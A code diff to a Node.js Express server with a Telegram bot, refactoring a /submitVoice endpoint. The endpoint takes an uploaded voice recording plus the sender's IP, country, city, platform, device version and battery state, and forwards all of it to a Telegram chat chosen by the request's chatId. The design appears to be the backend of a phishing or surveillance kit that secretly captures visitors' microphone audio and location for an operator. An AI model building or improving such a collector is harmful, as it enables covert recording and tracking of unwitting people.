@@ -105,27 +105,34 @@ IP: ${additionalData.ip}
 
 app.post('/submitVoice', upload.single('voice'), (req, res) => {
     const chatId = req.body.chatId;
-    const voicePath = req.file.path;
+    const voiceFile = req.file;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
 
+    if (!voiceFile) {
+        console.error('No voice file received');
+        return res.status(400).json({ error: 'No voice file received' });
+    }
+
     const caption = `
-    معلومات إضافية:
-    IP: ${additionalData.ip}
-    الدولة: ${additionalData.country}
-    المدينة: ${additionalData.city}
-    المنصة: ${additionalData.platform}
-    إصدار الجهاز: ${additionalData.deviceVersion}
-    مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-    الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
+معلومات إضافية:
+IP: ${additionalData.ip}
+الدولة: ${additionalData.country}
+المدينة: ${additionalData.city}
+المنصة: ${additionalData.platform}
+إصدار الجهاز: ${additionalData.deviceVersion}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
     `;
 
-    bot.sendVoice(chatId, voicePath, { caption }).then(() => {
-        fs.unlinkSync(voicePath);
-        res.json({ success: true, message: 'Voice submitted successfully!' });
-    }).catch(error => {
-        console.error('Error sending voice message:', error);
-        res.status(500).json({ success: false, error: 'Error sending voice message.' });
-    });
+    bot.sendVoice(chatId, voiceFile.buffer, { caption })
+        .then(() => {
+            console.log('Voice sent successfully');
+            res.json({ success: true });
+        })
+        .catch(error => {
+            console.error('Error sending voice:', error);
+            res.status(500).json({ error: 'Failed to send voice message' });
+        });
 });
 
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
